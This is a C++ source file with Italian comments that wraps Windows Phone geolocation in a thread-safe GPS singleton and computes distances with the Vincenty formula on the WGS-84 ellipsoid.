#include "GPS.h"
#include "FunctionFunc.h"

#using <Windows.winmd>
#using <Platform.winmd>
using namespace Windows::Devices::Sensors;
using namespace Platform;


using namespace Windows::UI::Xaml;
using namespace Windows::Devices::Geolocation;
using namespace Windows::Foundation;
using namespace Windows::UI::Core;
using namespace Platform;
using namespace Windows::System::Threading;



GPS* GPS::_instance = NULL;
BOOL GPS::_bGpsReady = FALSE;
volatile LONG GPS::lLock = 0;

/************************************************
 * self & Release
 ***********************************************/
GPS* GPS::self(DWORD dwTimeout, DWORD dwMaximumAge) {
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		_Sleep(1);

	if (_instance == NULL) {
		_instance = new(std::nothrow) GPS();

		if (_instance)
			_instance->Initialize(dwTimeout, dwMaximumAge);
	}

	InterlockedExchange((LPLONG)&lLock, 0);

	return _instance;
}

/************************************************
 * Constructor & Destructor
 * Protected members
 ***********************************************/
GPS::GPS(void) : deviceObj(NULL) {
	_iReference = 0;
	_hMutex = NULL;
	_hGpsDevice = nullptr;
	_dwTickCount = 0;
	_dwTimeout = 0;
	_dwLastGps = 0;
	bInitialized = FALSE;
	deviceObj = Device::self();
}

void GPS::Stop() {
	WAIT_AND_SIGNAL(this->_hMutex);

	_iReference--;

	if (_iReference > 0) {
		UNLOCK(this->_hMutex);
		return;
	}

	if (this->_hGpsDevice != nullptr && this->_hGpsDevice != nullptr) {
		//GPSCloseDevice(_hGpsDevice);
		_hGpsDevice->GPSCloseDevice();
		_hGpsDevice = nullptr;
	}

	if (deviceObj)
		deviceObj->ReleaseGpsPowerState();

	bInitialized = FALSE;
	UNLOCK(this->_hMutex);
}

BOOL GPS::Start() {
	BOOL bRet;

	WAIT_AND_SIGNAL(this->_hMutex);
	_iReference++;

	// Non possiamo fare lo start due volte di seguito
	if (bInitialized) {
		UNLOCK(this->_hMutex);
		return TRUE;
	}

	// Entrambi i parametri sono gia' valorizzati al momento della ::self()
	bRet = Initialize(_dwTimeout, _dwMaximumAge);

	UNLOCK(this->_hMutex);
	return bRet;
}

GPS::~GPS() {
	if (this->_hMutex != NULL)
		CloseHandle(_hMutex);
	
	if (this->_hGpsDevice != nullptr && this->_hGpsDevice != nullptr)
	{
		//GPSCloseDevice(_hGpsDevice);
		_hGpsDevice->GPSCloseDevice();
	}

}

BOOL GPS::Initialize(DWORD dwTimeout, DWORD dwMaximumAge) {
	if (bInitialized)
		return TRUE;

	_dwTimeout = dwTimeout;
	_dwMaximumAge = dwMaximumAge;

	if (_hMutex == NULL)
		_hMutex = _CreateMutexW(NULL, FALSE, NULL);

	if (_hMutex == NULL) {
		bInitialized = FALSE;
		return FALSE;
	}

	if (_dwTimeout <= 0 || _dwMaximumAge == 0) {
		bInitialized = FALSE;
		return FALSE;	// Cannot initialize object!
	}

	///_hGpsDevice = GPSOpenDevice(NULL, NULL, NULL, 0);
	_hGpsDevice = ref new NativeGeolocationCapture();
	_hGpsDevice->GPSOpenDevice();
	


	if (_hGpsDevice == nullptr) {	// GPS Initialization failed
		bInitialized = FALSE;
		return FALSE;
	}

	if (_hGpsDevice != nullptr)
		GPS::_bGpsReady = TRUE;

	// Viene (e va) chiamato solo una volta
	if (deviceObj)
		deviceObj->SetGpsPowerState();

	bInitialized = TRUE;
	return TRUE;
}

BOOL GPS::GpsReady()
{
	return GPS::_bGpsReady;
}

/**
 *	Request refresh of ?
 **/
BOOL GPS::RefreshData() {
	WAIT_AND_SIGNAL(this->_hMutex);

	GPS_POSITION position;
	BOOL bResult = FALSE;

	if (GpsReady() == FALSE) {
		UNLOCK(this->_hMutex);
		return bResult;
	}
	
	ZeroMemory(&position, sizeof(GPS_POSITION));

	position.dwVersion = GPS_VERSION_1;
	position.dwSize = sizeof(GPS_POSITION);

	///if (GPSGetPosition(_hGpsDevice, &position, _dwMaximumAge, 0) == ERROR_SUCCESS) 
	if (_hGpsDevice->GPSGetPosition() == ERROR_SUCCESS) 
	{
		CopyMemory(&_gpsPosition, &position, sizeof(GPS_POSITION));
		_dwTickCount = _GetTickCount();
		bResult = TRUE;
	}

	UNLOCK(this->_hMutex);
	return bResult;
}

BOOL GPS::getGPS(GPS_POSITION *_out) {
	///if (_hGpsDevice == INVALID_HANDLE_VALUE || _hGpsDevice == NULL)
	if (_hGpsDevice == nullptr)
		return FALSE;

	if (GpsReady() == FALSE)
		return FALSE;

	if (_dwTickCount == 0 || ((_GetTickCount() - _dwTickCount) > _dwMaximumAge)) {
		if (RefreshData()) {
			CopyMemory((void *)_out, (void *)&_gpsPosition, sizeof(GPS_POSITION));
			return TRUE;
		}
	}

	return FALSE;
}

// 6378137.0f -> semiasse equatoriale dell'ellissoide internazionale WGS-84
// 1/298.257223563 -> schiacciamento dell'ellissoide internazionale WGS-84
// 6356752.3142 -> raggio polare dell'ellissoide internazionale WGS-84
double GPS::VincentFormula(double lat1, double lon1, double lat2, double lon2) {
	double a = 6378137.0f, b = 6356752.3142,  f = 1/298.257223563;
	double rad = PI / 180.0f, lon_rad = (lon2 - lon1) * rad;
	double U1 = atan((1 - f) * tan(lat1 * rad));
	double U2 = atan((1 - f) * tan(lat2 * rad));
	double sinU1 = sin(U1), cosU1 = cos(U1);
	double sinU2 = sin(U2), cosU2 = cos(U2);
	double cosSqAlpha, cos2SigmaM, sinSigma, cosSigma, sigma, sinAlpha;
	double cosLambda, sinLambda;
	double uSq, A, B, C, deltaSigma, s; 
	double lambda = lon_rad, lambdaP = 2 * PI;
	int iterations = 20;

	__try {
		while (fabs(lambda-lambdaP) > 0.000000000001f && --iterations > 0) {
			sinLambda = sin(lambda), cosLambda = cos(lambda);

			sinSigma = sqrt((cosU2 * sinLambda) * (cosU2 * sinLambda) + 
				(cosU1 * sinU2 - sinU1 * cosU2 * cosLambda) * (cosU1 * sinU2 - sinU1 * cosU2 * cosLambda));

			if (sinSigma == 0.0f) 
				return 0.0f;  // I punti sono coincidenti

			cosSigma = sinU1 * sinU2 + cosU1 * cosU2 * cosLambda;
			sigma = atan2(sinSigma, cosSigma);

			sinAlpha = cosU1 * cosU2 * sinLambda / sinSigma;

			cosSqAlpha = 1 - sinAlpha * sinAlpha;
			cos2SigmaM = cosSigma - 2 * sinU1 * sinU2/cosSqAlpha;

			//if (isnan(cos2SigmaM)) cos2SigmaM = 0;

			C = f / 16 * cosSqAlpha * (4 + f * (4 - 3 * cosSqAlpha));

			lambdaP = lambda;
			lambda = lon_rad + (1-C) * f * sinAlpha *
				(sigma + C * sinSigma * (cos2SigmaM + C * cosSigma * (-1 + 2 * cos2SigmaM * cos2SigmaM)));
		}

		if (iterations == 0) 
			return 0.0f;  // La formula non e' riuscita a convergere

		uSq = cosSqAlpha * (a * a - b * b) / (b * b);

		A = 1 + uSq / 16384 * (4096 + uSq * (-768 + uSq * (320 - 175 * uSq)));
		B = uSq / 1024 * (256 + uSq * (-128 + uSq * (74 - 47 * uSq)));

		deltaSigma = B * sinSigma * (cos2SigmaM + B / 4 * (cosSigma * (-1 + 2 * cos2SigmaM * cos2SigmaM)-
			B / 6* cos2SigmaM * (-3 + 4 * sinSigma * sinSigma) * (-3 + 4 * cos2SigmaM * cos2SigmaM)));

		s = b * A * (sigma - deltaSigma);
		return s;
	} __except(EXCEPTION_EXECUTE_HANDLER) {
		return 0.0f;
	}
}